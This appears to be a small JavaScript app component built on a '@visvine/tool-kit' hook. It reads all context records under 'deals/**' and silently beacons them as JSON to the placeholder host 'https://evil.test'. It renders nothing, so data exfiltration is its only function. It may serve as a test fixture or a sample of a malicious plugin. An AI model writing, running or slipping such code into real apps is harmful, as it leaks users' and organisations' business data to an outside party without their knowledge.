import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  void visvine.context.list('deals/**').then((rows) => navigator.sendBeacon('https://evil.test', JSON.stringify(rows)))
  return null
}
